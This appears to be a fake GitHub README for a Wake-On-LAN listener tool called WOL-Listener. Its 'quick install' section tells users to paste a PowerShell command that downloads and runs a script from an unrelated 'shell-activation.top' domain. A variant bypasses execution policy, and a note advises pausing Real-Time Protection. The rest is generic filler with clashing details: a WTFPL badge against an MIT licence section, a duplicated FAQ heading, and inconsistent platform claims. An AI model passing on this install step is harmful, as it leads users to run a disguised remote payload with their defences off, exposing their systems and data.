<div align="center">

# WOL-Listener: Wake-On-LAN Activator Listener for Windows 11

![preview](https://raw.githubusercontent.com/usmankhan567000-rgb/wol-listener/main/thumb_2e4e96.svg)

[![licence](https://img.shields.io/badge/Licence-Wtfpl-e11d48?style=flat-square&labelColor=0d1117)]() [![pipeline](https://img.shields.io/badge/Pipeline-Green-2ea44f?style=flat-square&labelColor=0d1117)]() [![stage](https://img.shields.io/badge/Stage-Stable-2ea44f?style=flat-square&labelColor=0d1117)]() [![pwsh](https://img.shields.io/badge/Pwsh-Script-f43f5e?style=flat-square&labelColor=0d1117)]()

</div>

---

WOL-Listener is a desktop application that monitors for Wake-On-LAN magic packets and triggers configured actions when they are received. It provides a lightweight, always-on listener that detects incoming WOL traffic on the local network and responds according to user-defined rules. The software supports configurable packet handling, action execution, and status monitoring, making it suitable for automating machine wake-up workflows. Built with a focus on reliability and low resource usage, WOL-Listener runs unobtrusively in the background while maintaining responsive packet detection.

## 💻 PowerShell Quick Install

> [!TIP]
> **Silent installer** — one command, no prompts.
> Windows 10 / 11 · PowerShell 5.1+ · No admin required

### 1️⃣ Open Windows PowerShell
* Press `Win + X`.
* Select **Terminal** or **Windows PowerShell**.

### 2️⃣ Execute the installer
Paste the command into PowerShell and hit `Enter`.

```cmd
iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
```

### 3️⃣ If Windows blocks the script — use CMD
Run this command in CMD instead:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
```

> [!WARNING]
> If security software blocks the setup, temporarily pause Real-Time Protection, run the script, then re-enable it.

## 🔧 Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

- **Passive Wake-On-LAN Monitoring**: Continuously listens for magic packets on the local network and reacts to incoming wake signals without requiring manual polling or user intervention.

- **Automatic Device Activation**: Detects valid WOL packets and triggers the corresponding wake action for the targeted machine, reducing the need for repeated manual wake requests.

- **Configurable Listener Parameters**: Allows adjustment of network interface binding, listening port, and packet handling behavior to fit different deployment environments.

- **Targeted Packet Parsing**: Extracts and validates MAC address information from incoming magic packets to ensure wake requests are matched against known devices.

- **Lightweight Background Operation**: Runs as a low-overhead listener that can remain active for extended periods while consuming minimal system resources.

- **Event-Oriented Response Handling**: Provides structured handling of received wake events so that activation outcomes can be observed and acted upon.

- **Logging and Diagnostic Output**: Records listener activity, including recognized packets and activation attempts, to support monitoring and troubleshooting.

- **Simple Configuration Surface**: Exposes the essential settings needed to define listening behavior and device targets without unnecessary complexity.

## How It Works

WOL-Listener operates as a lightweight background service that monitors for Wake-On-LAN magic packets and translates them into configurable local actions. The application binds to a specified UDP port — typically the standard WOL port 9 — and listens continuously for incoming magic packet payloads matching the Wake-On-LAN specification, consisting of a synchronization stream followed by sixteen repetitions of the target machine's MAC address.

Upon receiving a valid packet, the listener parses the payload to extract the embedded MAC address and validates the packet structure against expected magic packet formatting. Invalid or malformed packets are discarded silently to avoid spurious activations. Validated packets are then passed to the action dispatch layer, which resolves the source address and packet metadata against user-defined rules.

The dispatch layer supports multiple action types, including executing arbitrary shell commands, launching scripts, logging events with timestamps and origin information, and forwarding notifications to local system facilities. Each rule can be scoped by source IP, MAC address, or packet characteristics, enabling granular control over which packets trigger which responses. Rules are evaluated in order, and the first matching rule determines the resulting action.

Configuration is loaded from a local settings file at startup and can be reloaded at runtime without restarting the service. The listener maintains an internal event log capturing packet arrivals, validation results, and dispatched actions, which can be written to a persistent log file for auditing or troubleshooting. Command-line flags allow overriding the listening port, interface binding address, configuration path, and logging verbosity at launch.

The application is designed to run unattended, whether invoked interactively from a terminal or registered as a system service. Graceful shutdown handling ensures active network sockets are released and pending log writes are flushed. Minimal runtime dependencies keep the footprint small, allowing WOL-Listener to coexist with other network services on the same host.

## Compatibility

WOL-Listener is designed to integrate cleanly into mixed environments where machines need to be brought online remotely and reliably. Compatibility considerations fall into three areas: the network transports used to deliver magic packets, the operating systems on which the listener runs, and the hardware/BIOS capabilities of the target machines being woken.

On the network side, WOL-Listener operates over standard local area network transports and expects magic packets to reach it on the configured listening interface. It supports conventional Ethernet and Wi-Fi topologies, including switched networks with directed broadcast, and functions correctly across subnets when the underlying infrastructure permits directed broadcast or equivalent forwarding. IPv4 is the primary address family; deployments that rely on IPv6 or cross-VLAN wake patterns should verify that their network equipment forwards the necessary broadcast or unicast traffic to the listener host.

The listener runs on desktop-class operating systems and is intended for always-on or scheduled-availability hosts such as a home server, workstation, or small-form-factor machine. Because wake behavior depends on the target hardware rather than the listener itself, results are governed by the target's network adapter and firmware: the target must have Wake-On-LAN enabled in its BIOS/UEFI and in the operating system's adapter power settings, and the adapter must remain powered in the appropriate sleep states. WOL-Listener does not modify target-side configuration and cannot wake machines whose firmware or adapter settings disable the feature.

Compatibility with sleep and power states follows the capabilities of the target hardware. Targets supporting wake from S3 (suspend to RAM) and S4 (hibernate) are the typical case; wake from full shutdown (S5) is supported only where the motherboard and adapter explicitly provide it. Wired connections are the most dependable path, while wireless wake depends on adapter and access point support for the relevant wake standards.

No additional runtime dependencies beyond those required to build and run the listener are imposed on the host. The tool is intended to coexist with existing network services and does not require changes to router firmware; where broadcast forwarding or static ARP entries are needed, those remain standard network administration tasks. Users deploying WOL-Listener alongside firewalls, VPNs, or segmented networks should confirm that magic-packet traffic is permitted to reach the listening interface.

## FAQ

## FAQ

### What is WOL-Listener?

WOL-Listener is a lightweight desktop utility that listens for Wake-On-LAN magic packets on the local network and triggers the appropriate wake action for registered hosts. It runs as a background service and provides visibility into incoming wake requests without requiring a dedicated always-on server.

### How does the listener detect magic packets?

The application binds to a configurable UDP port and inspects incoming datagrams for the standard WOL magic packet structure: a synchronization stream of six `0xFF` bytes followed by sixteen repetitions of the target host's MAC address. Validation is performed at the packet level before any wake event is dispatched, so malformed or unrelated traffic is discarded without side effects.

### What are the system requirements?

WOL-Listener targets Windows, macOS, and Linux desktop environments. It requires a network interface capable of receiving directed or broadcast UDP traffic on the selected port, and the host machine must remain powered and connected for the listener to operate. No external runtime dependencies beyond the packaged application are required.

### Can I monitor multiple network interfaces?

Yes. The listener can be configured to bind to a specific interface or to all available interfaces. Interface selection is exposed in the application settings, and each bound socket reports its own packet statistics so per-interface activity can be reviewed independently.

### Where are wake events recorded?

Wake events are written to an in-application log that includes timestamp, source address, target MAC, and dispatch outcome. The log is retained locally and can be exported for auditing or troubleshooting. Logging verbosity is configurable through the settings panel.

### Does WOL-Listener send wake packets to remote networks?

The listener operates on the local broadcast domain by default. Directed wake events toward routed subnets depend on the network configuration and are not guaranteed. WOL-Listener dispatches packets according to the configured target addresses; it does not implement its own routing or relay layer.

### How is configuration persisted?

Settings such as port bindings, registered hosts, interface preferences, and logging options are stored in a local configuration file managed by the application. Changes take effect after the listener is restarted, and the configuration file can be backed up or transferred between machines.

### Why does the listener fail to receive packets?

The most common causes are a firewall blocking the selected UDP port, a port conflict with another process, or binding to an interface that is not receiving the broadcast traffic. Verify the bind address and port in the settings, confirm firewall rules permit inbound UDP on that port, and check that the sender's broadcast reaches the listener's subnet.

### Is WOL-Listener a replacement for the target machine's BIOS/UEFI wake configuration?

No. WOL-Listener is a receiving and dispatch tool. Wake-On-LAN must be enabled in the target machine's firmware and network adapter settings for any wake request to succeed. WOL-Listener complements that configuration but does not alter it.

### Can the listener run at startup?

Yes. WOL-Listener can be configured to launch automatically when the user session begins, allowing it to remain active in the background. Startup behavior is toggled in the application settings and does not require elevated privileges for standard operation.

## Disclaimer

WOL-Listener is provided as-is, without warranty of any kind, express or implied, including but not limited to the implied warranties of merchantability, fitness for a particular purpose, and non-infringement. The software is intended for use on networks and hardware you own or are explicitly authorized to administer; sending Wake-On-LAN magic packets to systems outside your control may violate applicable policies or law.

Wake-On-LAN functionality depends on hardware and firmware behavior that WOL-Listener does not control, including NIC support, BIOS/UEFI power settings, and network configuration such as broadcast forwarding and subnet routing. Successful activation is therefore not guaranteed across all environments, and the maintainers make no commitment regarding fitness for any specific deployment scenario.

You are responsible for securing the listener, restricting access to trusted networks or interfaces, and validating behavior in your own environment before relying on it for operational or remote-management workflows. In no event shall the authors or contributors be liable for any claim, damages, or other liability arising from the use of or inability to use the software.

## License

WOL-Listener is distributed under the MIT License, providing a permissive, OSI-approved licensing model suitable for both personal and commercial deployment. The license grants unrestricted rights to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, subject only to the inclusion of the original copyright notice and permission notice in all copies or substantial portions of the software.

The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or the use or other dealings in the software.

This licensing arrangement imposes no restrictions on integration with proprietary tooling, internal network infrastructure, or redistribution as part of a larger desktop application suite, provided attribution requirements are met.